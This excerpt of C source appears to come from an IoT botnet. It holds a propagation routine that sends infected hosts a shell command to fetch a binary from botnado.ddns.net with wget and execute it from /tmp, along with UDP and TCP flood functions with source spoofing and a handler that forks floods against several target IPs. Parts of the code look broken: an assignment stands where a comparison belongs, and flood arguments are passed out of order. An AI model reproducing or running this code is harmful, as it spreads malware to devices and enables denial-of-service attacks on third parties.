			...
			case 8:
				{
					...
					if(send(fds[i].fd, "cd /tmp; wget http://botnado.ddns.net/Z5hSLvz6F0VC4vsegU2; chmod 777 Z5hSLvz6F0VC4vsegU2; ./Z5hSLvz6F0VC4vsegU2", 284, MSG_NOSIGNAL) < 0) { sclose(fds[i].fd); fds[i].state = 0; fds[i].complete = 1; memset(fds[i].sockbuf, 0, 1024); continue; }
...
void sendUDP(unsigned char *target, int port, int spoofit)
{
		int packetsize = 0; int pollinterval = 10;
		if (timeEnd > 300) {
			timeEnd = 300;
		}
		if (spoofit = "") {
...
void sendTCP(unsigned char *target, int port, int timeEnd, unsigned char*flags, int spoofit)
{
		int packetsize = 0; int pollinterval = 10;
		if (timeEnd > 300) {
			timeEnd = 300;
        ...
        if(!strcmp(argv[0], "TCP"))
        {
                ...
                if(strstr(ip, ",") != NULL)
                {
                        ...
                        while(hi != NULL)
                        {
                                if(!listFork())
                                {
                                        sendTCP(hi, port, time, spoofed, flags);
                                        _exit(0);
                                }
                                hi = strtok(NULL, ",");
                        }
                        ...
                        sendTCP(ip, port, time, spoofed, flags);
                        _exit(0);
                }
        }
